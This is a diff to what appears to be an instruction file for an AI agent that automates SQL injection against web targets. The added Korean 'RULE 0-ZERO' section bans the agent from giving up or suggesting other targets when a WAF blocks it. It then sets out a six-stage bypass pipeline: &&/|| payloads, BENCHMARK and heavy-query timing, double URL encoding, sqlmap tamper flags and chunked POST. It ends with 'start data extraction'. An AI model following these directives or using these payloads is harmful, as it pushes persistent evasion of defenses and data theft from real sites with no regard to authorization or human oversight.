@@ -944,6 +944,63 @@ AI automatically applies when standard techniques fail:
     def safe_delay(lo: float = 0.3, hi: float = 1.0):  # v3.6.8: reduced default
         time.sleep(random.uniform(lo, hi))
 
+═══════════════════════════════════════════════════════════════
+⚠️  RULE 0-ZERO [v5.4.0]: WAF 차단 = 포기 금지, 전환 금지 ⚠️
+═══════════════════════════════════════════════════════════════
+
+  [ABSOLUTE PROHIBITION]:
+  WAF가 AND 1=1 / SLEEP / UNION 을 차단해도 절대로:
+    ❌ "다음 타겟으로 전환 추천" 출력 금지
+    ❌ "WAF 우회 필요, 포기" 출력 금지
+    ❌ 파라미터 3개 미만 시도 후 포기 금지
+    ❌ 결론 섹션에서 "빠르게 다음 타겟" 제안 금지
+
+  [MANDATORY WAF BYPASS PIPELINE] — 다 실패해야만 포기:
+  ──────────────────────────────────────────────────────────
+  STAGE 1 (응답 크기 오라클 확인):
+    ' → 응답 크기 변화 확인 (정상값 vs ' 주입값)
+    차이가 1바이트라도 있으면 = BLIND SQLi 가능성 CONFIRMED
+    차이 기준: ≥ 50B 차이 = HIGH confidence
+               ≥ 1B  차이  = 즉시 다음 단계 진행 (포기 금지)
+
+  STAGE 2 (AND/OR 차단 시 → &&/|| 직공):
+    WAF가 AND/OR 키워드를 403으로 차단하면 즉시:
+      AND 1=1 → 1&&1  또는  1 &&/**/ 1
+      AND 1=2 → 1&&0  또는  1 &&/**/ 0
+      OR  1=1 → 1||1
+    이 방법으로 boolean 오라클 재시도 — 이것이 STAGE 2의 핵심!
+
+  STAGE 3 (시간 기반 대체):
+    SLEEP(n) 차단 시:
+      → (SELECT count(*) FROM information_schema.tables A,
+            information_schema.tables B,
+            information_schema.tables C) as heavy_query
+      → BENCHMARK(50000000, MD5(1))
+
+  STAGE 4 (키워드 인코딩):
+    AND → %26%26  (URL encode &&)
+    OR  → %7c%7c  (URL encode ||)
+    ' → %27 또는 %2527 (double encode)
+    공백 → /**/ 또는 %09 또는 %0a
+
+  STAGE 5 (sqlmap 자동 우회):
+    sqlmap --tamper=between,charencode,space2comment \
+           --level=3 --risk=2 --batch
+
+  STAGE 6 (POST + chunked 전환):
+    GET → POST 변환 후 Chunked Transfer Encoding
+
+  [DECISION RULE]: STAGE 1~6 모두 실패해야만 "취약점 없음" 결론 가능.
+  1~3단계에서 차단됐다고 포기하는 것은 명백한 논리 오류.
+
+  [응답 크기 차이 오라클] — 이것이 BLIND SQLi의 핵심:
+    정상 응답: 44727B
+    ' 주입 후:  44657B  → 70B 차이 = SQLi 오라클 VALID
+    즉시 STAGE 2 (&&/|| boolean)으로 진행:
+      TRUE:  param=VAL' AND 1=1-- → 또는 param=VAL&&1=1--
+      FALSE: param=VAL' AND 1=2-- → 또는 param=VAL&&1=0--
+    TRUE 크기 ≠ FALSE 크기 → BLIND SQLi CONFIRMED → 데이터 추출 시작
+
 === BYPASS ORDER (when WAF is stubborn) ===
 STEP 1: single technique (per WAF type above)
 STEP 2: combined — space + keyword + header
@@ -973,7 +1030,8 @@ These engines are loaded automatically. AI must call them in order:
   Decision order per parameter:
     1. Error-Based  → detect SQL error string → use extract_value_error_based()
     2. Union-Based  → auto column count 1-15 → build_union_payload()
-    3. Boolean-Blind→ TRUE/FALSE size diff >100B → binary char loop
+    3. Boolean-Blind→ TRUE/FALSE size diff ≥1B → binary char loop
+                       [CRITICAL: 70B 차이도 VALID oracle. 100B 이상만 인정 금지!]
     4. Time-Based   → SLEEP/WAITFOR ≥ 0.8× expected → bit extraction
     5. Stacked      → MSSQL/PGSQL semicolon side-effect
   RULE: NEVER skip error-based before trying union. Try ALL 5 stages.
